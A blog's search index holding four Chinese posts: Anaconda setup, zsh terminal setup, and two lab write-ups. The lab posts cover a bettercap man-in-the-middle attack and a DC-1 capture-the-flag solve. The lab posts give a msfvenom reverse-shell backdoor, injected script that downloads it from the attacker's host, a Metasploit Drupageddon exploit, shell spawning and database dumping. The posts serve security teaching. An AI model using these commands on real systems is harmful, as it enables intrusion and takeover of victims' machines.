<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Mac下命令行版本的Anaconda安装及常用命令</title>
    <url>/2019/12/03/anaconda-installformac/</url>
    <content><![CDATA[<p>简单记录一下在Mac下Anaconda安装的过程<a id="more"></a></p>
<p>一开始的我对Anaconda总是拒绝的，大概是因为自己固步自封不喜欢接受新事物(虽然这也不是新东西啊…)<br>在之前我一直都是用什么包直接<code>pip install xxx</code>完事。<br>直到很久之前某一天发现，为某个项目单独配置一个新的编码环境，各自独立是多么的幸福，用完也可以把这个环境全部删除，对本身的环境丝毫不影响，但无奈于我这个小废物一直很懒，直到今天才想起来安装一下Anaconda。</p>
<h3 id="1-下载命令行版本安装包"><a href="#1-下载命令行版本安装包" class="headerlink" title="1. 下载命令行版本安装包"></a>1. 下载命令行版本安装包</h3><p><a href="https://www.anaconda.com/download/#macos" target="_blank" rel="noopener">官网地址</a></p>
<h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h3><p>cd到下载目录，输入以下命令直接安装即可<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">bash Anaconda3-2019.10-MacOSX-x86_64.sh</span><br></pre></td></tr></table></figure><br>之后一直回车即可（有一步让你同意什么什么协议，输入<code>yes</code>即可）</p>
<h3 id="3-添加环境变量"><a href="#3-添加环境变量" class="headerlink" title="3.添加环境变量"></a>3.添加环境变量</h3><p>编辑<code>.bash_profile</code><br>mac下可以用<code>open</code>命令<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">open ~/.bash_profile</span><br></pre></td></tr></table></figure><br>添加一行<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"/Users/yourname/anaconda3/bin:<span class="hljs-variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure><br>上面的路径要输入你对应的路径名<br>刷新生效<code>source</code><br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure><br>如果安装了<code>oh-my-zsh</code><br>还需要编辑 <code>.zshrc</code>文件，同样添加上面的一行，之后别忘了<code>source</code></p>
<hr>
<p>我们输入<code>python</code>即可进入<code>anaconda</code><br><img src="/2019/12/03/anaconda-installformac/1.png" alt="1.png"></p>
<h3 id="4-关于卸载"><a href="#4-关于卸载" class="headerlink" title="4.关于卸载"></a>4.关于卸载</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">rm -rf ~/anaconda3</span><br><span class="line">open ~/.bash_profile</span><br><span class="line"><span class="hljs-comment"># 删除路径</span></span><br><span class="line"></span><br><span class="line">rm -rf ~/.condarc ~/.conda ~/.continuum</span><br></pre></td></tr></table></figure></p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="环境管理"><a href="#环境管理" class="headerlink" title="环境管理"></a>环境管理</h4><h5 id="1-查看当前系统下的环境"><a href="#1-查看当前系统下的环境" class="headerlink" title="1. 查看当前系统下的环境"></a>1. 查看当前系统下的环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda info -e</span><br></pre></td></tr></table></figure></p>
<h5 id="2-查看环境管理的全部命令操作"><a href="#2-查看环境管理的全部命令操作" class="headerlink" title="2. 查看环境管理的全部命令操作"></a>2. 查看环境管理的全部命令操作</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda env -h</span><br></pre></td></tr></table></figure></p>
<h5 id="3-创建环境"><a href="#3-创建环境" class="headerlink" title="3. 创建环境"></a>3. 创建环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment"># 创建新环境</span></span><br><span class="line">conda create -n env_name</span><br><span class="line"><span class="hljs-comment">#创建制定python版本的环境</span></span><br><span class="line">conda create -n env_name python=3.6</span><br><span class="line"><span class="hljs-comment">#创建包含某些包的环境</span></span><br><span class="line">conda create -n env_name numpy scipy</span><br><span class="line"><span class="hljs-comment">#创建指定python版本下包含某些包的环境</span></span><br><span class="line">conda create -n env_name python=3.6  numpy scipy</span><br></pre></td></tr></table></figure></p>
<h5 id="4-激活进入某个环境"><a href="#4-激活进入某个环境" class="headerlink" title="4. 激活进入某个环境"></a>4. 激活进入某个环境</h5><ul>
<li>win<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda activate env_name</span><br></pre></td></tr></table></figure></li>
<li>mac<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> activate env_name</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="5-退出环境"><a href="#5-退出环境" class="headerlink" title="5. 退出环境"></a>5. 退出环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda deactivate</span><br></pre></td></tr></table></figure></p>
<h5 id="6-复制某个环境"><a href="#6-复制某个环境" class="headerlink" title="6. 复制某个环境"></a>6. 复制某个环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda create new_env_name old_env_name</span><br></pre></td></tr></table></figure></p>
<h5 id="7-删除某个环境"><a href="#7-删除某个环境" class="headerlink" title="7. 删除某个环境"></a>7. 删除某个环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda env remove -n env_name</span><br></pre></td></tr></table></figure></p>
<h4 id="包管理"><a href="#包管理" class="headerlink" title="包管理"></a>包管理</h4><h5 id="1-查看当前环境下已安装的包"><a href="#1-查看当前环境下已安装的包" class="headerlink" title="1. 查看当前环境下已安装的包"></a>1. 查看当前环境下已安装的包</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda list</span><br></pre></td></tr></table></figure></p>
<h5 id="2-查看指定环境下的包"><a href="#2-查看指定环境下的包" class="headerlink" title="2. 查看指定环境下的包"></a>2. 查看指定环境下的包</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda list -n xxx</span><br></pre></td></tr></table></figure></p>
<h5 id="3-查找包"><a href="#3-查找包" class="headerlink" title="3. 查找包"></a>3. 查找包</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">conda search xxx</span><br></pre></td></tr></table></figure></p>
<h5 id="4-更新包"><a href="#4-更新包" class="headerlink" title="4. 更新包"></a>4. 更新包</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda update xxx</span><br></pre></td></tr></table></figure></p>
<h5 id="5-安装包"><a href="#5-安装包" class="headerlink" title="5. 安装包"></a>5. 安装包</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">conda install xxx</span><br><span class="line">pip install xxx</span><br></pre></td></tr></table></figure></p>
<h5 id="6-指定的安装环境"><a href="#6-指定的安装环境" class="headerlink" title="6. 指定的安装环境"></a>6. 指定的安装环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda install -n env_name xxx</span><br></pre></td></tr></table></figure></p>
<h5 id="7-安装anaconda发行版中的所有包"><a href="#7-安装anaconda发行版中的所有包" class="headerlink" title="7. 安装anaconda发行版中的所有包"></a>7. 安装anaconda发行版中的所有包</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda install anaconda</span><br></pre></td></tr></table></figure></p>
<h5 id="8-卸载包"><a href="#8-卸载包" class="headerlink" title="8. 卸载包"></a>8. 卸载包</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda remove xxx</span><br></pre></td></tr></table></figure></p>
<h4 id="conda管理"><a href="#conda管理" class="headerlink" title="conda管理"></a>conda管理</h4><h5 id="0-conda修改源"><a href="#0-conda修改源" class="headerlink" title="0. conda修改源"></a>0. conda修改源</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span><br><span class="line">conda config --<span class="hljs-built_in">set</span> show_channel_urls yes</span><br></pre></td></tr></table></figure><br>换回默认源<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda config --remove-key channels</span><br></pre></td></tr></table></figure><br>在执行conda config 命令的时候会在当前用户目录下创建 .condarc  文件，可以查看更换源前后该文件内容的变化。</p>
<h5 id="1-检查conda版本"><a href="#1-检查conda版本" class="headerlink" title="1. 检查conda版本"></a>1. 检查conda版本</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda --version</span><br></pre></td></tr></table></figure></p>
<h5 id="2-升级当前版本的conda"><a href="#2-升级当前版本的conda" class="headerlink" title="2. 升级当前版本的conda"></a>2. 升级当前版本的conda</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>折腾---美观Mac下的终端</title>
    <url>/2019/07/21/My-Terminal/</url>
    <content><![CDATA[<p><del>讲道理</del>，Mac下的shell,嗯就是那个<strong>bash</strong>真的是太丑了，虽然可以修改背景色之类的还是觉得丑，所以就用<strong>iTerm2</strong>这个玩意代替他了，并且使用<strong>zsh</strong>代替了<strong>bash</strong>…<a id="more"></a>虽然<strong>bash</strong>的功能已经很强大，但对于以<del>懒惰</del>为美德的程序员来说，比如说我，bash的提示功能还不够强大，界面也不够酷炫，并非理想工具。而<strong>zsh</strong>的功能及其强大，只是配置过于复杂，起初只有极客在用，后来，有个穷极无聊的程序员可能实在是看不下去广大猿友使用单调的<strong>bash</strong>，于是他创建了一个名为<strong><em>oh-my-zsh</em></strong>的开源项目…</p>
<p>自此，只需要简单的安装配置，我们也都可以用上<del>高档大气上档次，狂拽炫酷吊炸天的</del><strong><em>oh-my-zsh</em></strong>了。</p>
<hr>
<h3 id="一、安装iTerm2代替shell"><a href="#一、安装iTerm2代替shell" class="headerlink" title="一、安装iTerm2代替shell"></a>一、安装iTerm2代替shell</h3><h4 id="1-官方下载地址：https-www-iterm2-com"><a href="#1-官方下载地址：https-www-iterm2-com" class="headerlink" title="1. 官方下载地址：https://www.iterm2.com/"></a>1. <strong>官方下载地址：</strong><a href="https://www.iterm2.com/" target="_blank" rel="noopener">https://www.iterm2.com/</a></h4><p>   安装完成后，在/bin目录下会多出一个zsh的文件。Mac系统默认使用<strong>Bash</strong>作为终端，修改默认为<strong>zsh</strong>的命令如下：</p>
<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure></p>
<h4 id="2-替换背景图片"><a href="#2-替换背景图片" class="headerlink" title="2. 替换背景图片"></a>2. <strong>替换背景图片</strong></h4><p>   Iterm2-&gt;Preferences-&gt;Profiles-&gt;window-&gt;Background image</p>
<p>   <img src="/2019/07/21/My-Terminal/change_background.png" alt="change_background"></p>
<hr>
<h3 id="二、安装oh-my-zsh"><a href="#二、安装oh-my-zsh" class="headerlink" title="二、安装oh-my-zsh"></a>二、安装oh-my-zsh</h3><p><strong>命令 2种方式：</strong></p>
<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sh -c <span class="hljs-string">"<span class="hljs-variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></p>
<p>   或者</p>
<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sh -c <span class="hljs-string">"<span class="hljs-variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure></p>
<p>   用第二种方式需要wget，如果没有wget请安装</p>
<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">brew install wget</span><br></pre></td></tr></table></figure></p>
<p>   如果没有homebrew请自行百度安装这个强大的包管理工具，类似于centos或者ubuntu下的yum和apt-get</p>
<p>   接下来只需要简单的配置，就可以享受oh-my-zsh的强大啦！</p>
<hr>
<h3 id="三、主题选择"><a href="#三、主题选择" class="headerlink" title="三、主题选择"></a>三、主题选择</h3><p>Oh-my-zsh有很多主题，具体请查看：<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes" target="_blank" rel="noopener">主题列表</a></p>
<p>我选择的主题是<code>ys</code></p>
<p><img src="/2019/07/21/My-Terminal/terminal.png" alt="terminal"></p>
<p><del>请忽视我正在安装的东西…</del></p>
<p>想要修改主题，打开~/.zshrc文件修改一下ZSH_THEME变量即可<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure><br>找到ZSH_THEME，将此变量值改为”ys”<br><figure class="highlight c hljs"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=<span class="hljs-string">"ys"</span></span><br></pre></td></tr></table></figure><br>最后更新修改后的配置文件<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></p>
<hr>
<h3 id="四、自动补全插件"><a href="#四、自动补全插件" class="headerlink" title="四、自动补全插件"></a>四、自动补全插件</h3><p>linux的命令有很多，想要全部记住是不可能的事情，<del>如果你是大佬当我没说</del>，这时候就需要我们的自动补全插件啦！<br>自动补全插件有很多种，一个是incr.zsh,下载此插件的命令为：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">wget http://mimosa-pudica.net/src/incr-0.2.zsh</span><br></pre></td></tr></table></figure><br>这个插件确实很屌，但是存在一些bug，比如很卡顿！对，你可以明显感受到卡顿，有点卡顿或许还能忍，但是在使用命令<code>git clone http</code> 对，我下一个要敲 <code>:</code>    可就在我敲下它的一瞬间，终端竟然卡住了，住了，了…… 应该是提示功能太过强大导致的吧…<br>所以我用了另一个插件代替它的功能，但是就没有第一个插件功能这么牛逼了，他的基本作用就是根据历史输入指令的记录即时的提示，这么看起来也算不上自动补全插件咯，但是也是可以提高一点效率的呀！它就是Autosuggestion<br>首先切换目录<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> ~/.oh-my-zsh/custom/plugins/</span><br></pre></td></tr></table></figure><br>下载插件：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class="hljs-variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><br>和修改主题需要修改配置文件一样，先打开配置文件~/.zshrc<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure><br>在最后添加一行，也就是把刚刚下载的插件的路径添加进去<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br></pre></td></tr></table></figure><br>保存后执行更新配置文件命令<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></p>
<p>到这里就结束啦，开始我们的<del>装逼</del>之旅吧嘻嘻嘻！<br>最后贴一张现在的终端界面吧哈哈！<br><img src="/2019/07/21/My-Terminal/terminal_now.png" alt="Terminal_now"><br>为什么这张图这么大呢，哈哈因为我喜欢吧终端常开着放在几个桌面的最左端，有需要的时候直接切换过去，是不是贼方便呢嘻嘻！！</p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>使用bettercap进行渗透测试</title>
    <url>/2019/09/10/hacker-1/</url>
    <content><![CDATA[<p>软件综合训练—信息安全方向课程总结<a id="more"></a></p>
<p>（以下所有在虚拟机kali_linux下实现）</p>
<h3 id="一、bettercap是什么"><a href="#一、bettercap是什么" class="headerlink" title="一、bettercap是什么"></a>一、bettercap是什么</h3><p>bettercap是一款完整，模块化，轻量级，易扩展的中间人攻击测试工具和框架。</p>
<p><strong>如何安装？</strong></p>
<h4 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1. 安装依赖"></a>1. 安装依赖</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ruby-dev libpcap-dev</span><br></pre></td></tr></table></figure></p>
<h4 id="2-安装稳定版本（GEM）"><a href="#2-安装稳定版本（GEM）" class="headerlink" title="2. 安装稳定版本（GEM）"></a>2. 安装稳定版本（GEM）</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">gem install bettercap</span><br></pre></td></tr></table></figure></p>
<p>至此，bettercap已成功安装，下面让我们开始吧！</p>
<h3 id="二、DNS欺骗"><a href="#二、DNS欺骗" class="headerlink" title="二、DNS欺骗"></a>二、DNS欺骗</h3><p>创建一个dns.conf文件，下面这个dns语句的意思是：所有的以<code>.com</code>结尾的网站全部解析到我的本地http服务器，<code>.*.com</code>就是一个正则，也可以是自定义的正则。</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">1.1.1.1 .*.com</span><br></pre></td></tr></table></figure></p>
<p>之后使用bettercap命令进行DNS欺骗：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">bettercap -X -I eth0 -T 192.168.73.129 -G 192.168.73.2 --dns dns.conf</span><br></pre></td></tr></table></figure></p>
<p>第一个ip地址为局域网内要攻击的主机ip地址，-G参数为网关。</p>
<p>为什么一定是局域网内的呢，因为我们利用的是ARP报文的广播原理，而ARP报文只能在同一网段内广播，因此我们需要将kali_linux与受攻击的win7在同一网段下，由于我是用VMwa re开了这两个虚拟机，都是利用nat链接，当然属于同一个网段啦！</p>
<p><img src="/2019/09/10/hacker-1/dns.png" alt="dns"></p>
<p>之后被攻击的win7主机会出现什么现象呢？</p>
<p><img src="/2019/09/10/hacker-1/win7_1.png" alt="win7_1"></p>
<p>可以看到，ping百度的域名却返回的是我们在dns.conf中写入的1.1.1.1</p>
<h3 id="三、ARP欺骗-msf"><a href="#三、ARP欺骗-msf" class="headerlink" title="三、ARP欺骗+msf"></a>三、ARP欺骗+msf</h3><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统签名开发。</p>
<p><strong>进行html注入中间人攻击</strong></p>
<h4 id="1-生成后门"><a href="#1-生成后门" class="headerlink" title="1. 生成后门"></a>1. 生成后门</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.73.128 LPORT=444 -f exe &gt; run.exe</span><br></pre></td></tr></table></figure></p>
<p>LHOST为监听主机ip，即攻击者ip。生成一个run.exe文件。</p>
<p><img src="/2019/09/10/hacker-1/runexe.png" alt="runexe"></p>
<h4 id="2-启动本地http服务"><a href="#2-启动本地http服务" class="headerlink" title="2. 启动本地http服务"></a>2. 启动本地http服务</h4><p>首先使用screen创建后台：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S test1</span><br></pre></td></tr></table></figure></p>
<p>​    之后输入：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/10/hacker-1/test1.png" alt="test1"></p>
<p>按ctrl+a+d返回。</p>
<h4 id="3-启动注入中间人攻击"><a href="#3-启动注入中间人攻击" class="headerlink" title="3. 启动注入中间人攻击"></a>3. 启动注入中间人攻击</h4><p>同样的，我们先使用screen创建一个新后台test2</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">bettercap -I eth0 -X  -T 192.168.73.129  -G 192.168.73.2  --proxy-module=injecthtml --html-data <span class="hljs-string">"&lt;script&gt;document.body.onclick = function()&#123;window.open('http://192.168.73.128:8888/run.exe')&#125; &lt;/script&gt;"</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/10/hacker-1/test2.png" alt="test2"><br>按ctrl+a+d返回</p>
<h4 id="4-在本地启动监听"><a href="#4-在本地启动监听" class="headerlink" title="4. 在本地启动监听"></a>4. 在本地启动监听</h4><p>与前面一样，创建新后台test3。</p>
<p>之后输入命令如下所示：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">		msf &gt; </span><br><span class="line">		use exploit/multi/handler</span><br><span class="line">		<span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">		<span class="hljs-built_in">set</span> lhost 192.168.73.128</span><br><span class="line">		<span class="hljs-built_in">set</span> lport 444</span><br><span class="line">		run -j</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/10/hacker-1/test3.png" alt="test3"></p>
<h4 id="5-在被攻击端运行run-exe"><a href="#5-在被攻击端运行run-exe" class="headerlink" title="5. 在被攻击端运行run.exe"></a>5. 在被攻击端运行run.exe</h4><p>使用被攻击的win7虚拟机随便打开一个网页，比如 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 之后随便点击一个地方，就会触发我们注入html源码中的函数，跳转到我们的攻击主机ip+端口的web服务上并下载run.exe文件，若点击运行，则被攻击主机的控制权我们就可以拿到了。</p>
<p><img src="/2019/09/10/hacker-1/downrunexe.png" alt="download"></p>
<h4 id="6-获得被攻击主机的控制权"><a href="#6-获得被攻击主机的控制权" class="headerlink" title="6. 获得被攻击主机的控制权"></a>6. 获得被攻击主机的控制权</h4><p>在我们的监听会话中我们输入<code>sessions</code>命令可以看到如下内容：</p>
<p><img src="/2019/09/10/hacker-1/sessions.png" alt="sessions"></p>
<p>​    我们可以看到id为1的主机便是我们攻击的主机，那么接下来怎么获取它的控制权呢，很简单，我们只要输入：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sessions 1</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure></p>
<p><code>meterpreter &gt;</code>为输入<code>sessions 1</code>之后的提示符不需要输入。</p>
<p>​    接下来我们便可以看到如下内容：</p>
<p><img src="/2019/09/10/hacker-1/end.png" alt="end"></p>
<p>这个界面是不是很熟悉呢，嘿嘿嘿</p>
]]></content>
      <categories>
        <category>软件综合训练课程</category>
      </categories>
  </entry>
  <entry>
    <title>攻防夺旗DC1</title>
    <url>/2019/09/11/hacker-2/</url>
    <content><![CDATA[<p>软件综合训练第二天….<a id="more"></a></p>
<h3 id="1-扫描被攻击主机ip地址："><a href="#1-扫描被攻击主机ip地址：" class="headerlink" title="1. 扫描被攻击主机ip地址："></a>1. <strong>扫描被攻击主机ip地址</strong>：</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.73.0/24</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/11/hacker-2/1.png" alt="1.png"></p>
<p>从结果发现，共有五台在线主机，IP末尾为.1、.2和.254位虚拟机VMware自带，而kali_linux的IP为192.168.73.131，因此我们要攻击的主机的ip为192.168.73.130。</p>
<p>###2. <strong>获取更多信息</strong>：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sSV -A  -p- -T5 192.168.73.130</span><br></pre></td></tr></table></figure></p>
<p>-Pn为了不同ping，因为知道主机已启动，-p-扫描所有端口，-sC用默认脚本，-sSV发现开放端口然后尝试使用bannergrabbing服务名称和版本信息，-A运行大量nmap脚本来识别操作系统并收集更多信息，比较激进，-T5用于扫描更快。-T3是nmap默认值，在此下可用于避免网络上的IDS（他们会延迟扫描）。ip地址段为kali_linxu所属网段。</p>
<p><img src="/2019/09/11/hacker-2/2.png" alt="2.png"></p>
<p>可以从结果看出，该服务器是一个web服务器，因为它开放了80端口，并且使用了Drupal的CMS进行搭建的网站。因此我们可以考虑利用Drupal的漏洞进行攻击，但是利用nmap仅仅只能得到其版本为7，不能更加精确，因此我们需要确定他更加具体的版本号。</p>
<p>###3. <strong>进一步扫描，确定drupal版本：</strong></p>
<p>安装并使用droopescan对drupal 进行扫描：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/droope/droopescan.git</span><br><span class="line"><span class="hljs-built_in">cd</span> droopescan</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></p>
<p>使用方法：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">./droopescan scan drupal -u dc1.com</span><br></pre></td></tr></table></figure></p>
<p>比如现在我们要攻击的主机为192.168.73.130，则具体命令为：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">./droopescan scan drupal -u 192.168.73.130</span><br></pre></td></tr></table></figure></p>
<p>扫描结果如下：</p>
<p><img src="/2019/09/11/hacker-2/3.png" alt="3.png"></p>
<p>由结果我们发现，该网站所使用的drupal版本可能为7.22～7.26，因此存在Drupageddon漏洞</p>
<p>（Drupageddon是Drupal版本7.32中暴露的漏洞。它允许远程代码执行和shell访问）</p>
<h3 id="4-利用Drupageddon"><a href="#4-利用Drupageddon" class="headerlink" title="4. 利用Drupageddon"></a>4. <strong>利用Drupageddon</strong></h3><p>msf中已经内置该漏洞脚本，可以直接在msf中查找</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/11/hacker-2/4.png" alt="4.png"></p>
<p>接下来就是要利用该脚本进行攻击了，攻击方法如下（在msfconsole下）：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/drupal_drupageddon</span><br><span class="line"><span class="hljs-built_in">set</span> rhost 192.168.73.130</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
<p>rhost参数为被攻击的主机ip地址。</p>
<p><img src="/2019/09/11/hacker-2/5.png" alt="5.png"></p>
<p>这样我们就获得了这个网站的控制权了，但却不是root用户，我们可以输入以下命令发现我们并没有获得全部的权限：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/11/hacker-2/6.png" alt="6.png"></p>
<p>我们可以看到通过<code>whoami</code>命令得到的并不是root用户。</p>
<h3 id="5-Get-Flag1"><a href="#5-Get-Flag1" class="headerlink" title="5. Get Flag1 !"></a>5. <strong>Get Flag1 !</strong></h3><p>当我们获取到了被攻击主机的网站控制权后，我们可以试一试<code>ls</code>命令，发现该目录下有一个flag1.txt，我们找到了一个旗子！让我们打开来看看里面有什么提示呢！</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; cat flag1.txt</span><br></pre></td></tr></table></figure></p>
<p>注意：一定要在meterpreter &gt; 提示符下，如果你跟着我的上一步输入了<code>shell</code>，那请先输入exit退出到<code>meterpreter &gt;</code></p>
<p><img src="/2019/09/11/hacker-2/7.png" alt="7.png"></p>
<p>我们可以看到第一条提示：Every good CMS needs a config file - and so do you.</p>
<p>提示配置文件，谷歌得知在在sites/default/settings.php下。</p>
<p>让我们打开配置文件看看都有什么内容呢…</p>
<p><img src="/2019/09/11/hacker-2/8.png" alt="8.png"></p>
<p>可以看到在第一行写着：flag2</p>
<p>Brute force and dictionary attacks aren’t the</p>
<ul>
<li>only ways to gain access (and you WILL need access).</li>
<li>What can you do with these credentials?</li>
</ul>
<p>同时获得数据库用户名密码（dbuser/R0ck3t)</p>
<p>接下来让我们进入数据库，试着找找有没有下一个flag，进入数据库命令如下：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">mysql -u dbuser -p</span><br></pre></td></tr></table></figure></p>
<p>之后要求你输入密码，密码上面已经得到了：R0ck3t</p>
<p>之后输入：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure></p>
<p>这样就得到了加密后的admin密码，下面我们需要把数据库dump下来。</p>
<h3 id="6-把数据库dump下来："><a href="#6-把数据库dump下来：" class="headerlink" title="6. 把数据库dump下来："></a>6. <strong>把数据库dump下来：</strong></h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">mysqldump -u dbuser -p drupaldb &gt; 1.sql</span><br></pre></td></tr></table></figure></p>
<p>使用ls命令可以看到当前目录下存在1.sql文件。</p>
<p><img src="/2019/09/11/hacker-2/9.png" alt="9.png"></p>
<p>使用cat命令打开1.sql查找flag3，可以发现存在提示：search_dataset:flag3 special perms will help find the passwd but you ll need to exec that command to work out how to get what s in the shadow</p>
<p>两个提示：一个find，一个passwd</p>
<h3 id="7-根据提示，寻找其余flag"><a href="#7-根据提示，寻找其余flag" class="headerlink" title="7. 根据提示，寻找其余flag"></a>7. <strong>根据提示，寻找其余flag</strong></h3><p>因为passwd为配置文件，位于/etc/passwd，因此我们cd到/etc目录下查看passwd文件内容：</p>
<p><img src="/2019/09/11/hacker-2/10.png" alt="10.png"></p>
<p>我们可以发现passwd文件内容最后一行存在一个用户名为flag4，我们于是cd到flag4的用户目录/home/flag4下查看。</p>
<p><img src="/2019/09/11/hacker-2/11.png" alt="11.png"></p>
<p>我们发现该用户目录下有一个flag4.txt，于是我们继续用cat命令查看该文件内容。</p>
